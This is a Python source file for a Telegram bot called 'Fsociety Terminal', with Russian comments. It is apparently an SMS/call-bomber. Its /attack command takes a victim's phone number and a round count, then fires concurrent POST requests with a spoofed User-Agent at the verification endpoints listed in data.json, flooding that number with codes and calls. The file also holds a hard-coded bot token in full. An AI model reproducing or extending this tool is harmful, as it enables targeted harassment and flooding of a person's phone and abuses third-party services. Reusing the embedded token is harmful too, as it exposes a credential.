import json
import asyncio
import logging
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from fake_useragent import UserAgent

TOKEN = "8327514123:AAHlDhGumKA87OPp5cHw4eY65uyGVmIT8B0"

class GlobalState:
    def __init__(self):
        self.is_running = False
        self.stop_requested = False  # Флаг для остановки

state = GlobalState()
ua = UserAgent()

# --- ФУНКЦИЯ ОТПРАВКИ ЗАПРОСА ---
async def send_request(name, url, data):
    if state.stop_requested:
        return None
    
    headers = {"User-Agent": ua.random, "Content-Type": "application/json"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, headers=headers, timeout=10) as resp:
                return resp.status
    except:
        return "Error"

# --- ЛОГИКА АТАКИ ---
async def start_attack_logic(phone, runs, update, context):
    state.is_running = True
    state.stop_requested = False
    chat_id = update.effective_chat.id
    
    # Загружаем сервисы
    try:
        with open("data.json", "r", encoding="utf-8") as f:
            config = json.load(f)
        services = config["services"]
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Ошибка JSON: {e}")
        state.is_running = False
        return

    await context.bot.send_message(
        chat_id=chat_id, 
        text=f"🚀 <b>Атака на {phone} запущена!</b>\nИспользуйте /stop для завершения.",
        parse_mode='HTML'
    )

    for i in range(int(runs)):
        if state.stop_requested:
            break
            
        await context.bot.send_message(chat_id=chat_id, text=f"⏳ Круг {i+1}...")
        
        tasks = []
        for name, s in services.items():
            # Форматируем номер
            fmt_phone = ''.join(filter(str.isdigit, phone))
            url = s["url"].replace("%PHONE%", fmt_phone)
            payload = {k: (v.replace("%PHONE%", fmt_phone) if isinstance(v, str) else v) for k, v in s["data"].items()}
            
            tasks.append(send_request(name, url, payload))
        
        await asyncio.gather(*tasks)
        await asyncio.sleep(2) # Пауза между кругами

    status_msg = "стоп нахуй <b>Атака принудительно остановлена!</b>" if state.stop_requested else "стоп нахуй <b>Атака завершена успешно!</b>"
    await context.bot.send_message(chat_id=chat_id, text=status_msg, parse_mode='HTML')
    
    state.is_running = False
    state.stop_requested = False

# --- ОБРАБОТЧИКИ ---

async def stop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if state.is_running:
        state.stop_requested = True
        await update.message.reply_text("Stopping... Остановка процессов. Подождите.")
    else:
        await update.message.reply_text("Сейчас нет активных атак.")

async def attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if state.is_running:
        await update.message.reply_text("⚠️ Система занята! Дождитесь окончания или используйте /stop.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Пример: <code>/attack 77071234567 2</code>", parse_mode='HTML')
        return

    asyncio.create_task(start_attack_logic(context.args[0], context.args[1], update, context))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("стоп нахуй", callback_data='stop_all')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("<b>Fsociety Terminal</b>\n/attack [номер] [круги]\n/stop - стоп нахуй", reply_markup=reply_markup, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'stop_all':
        state.stop_requested = True
        await query.edit_message_text("Сигнал остановки отправлен.")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_handler))
    app.add_handler(CommandHandler("stop", stop_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print(">>> Бот с кнопкой СТОП запущен!")
    app.run_polling()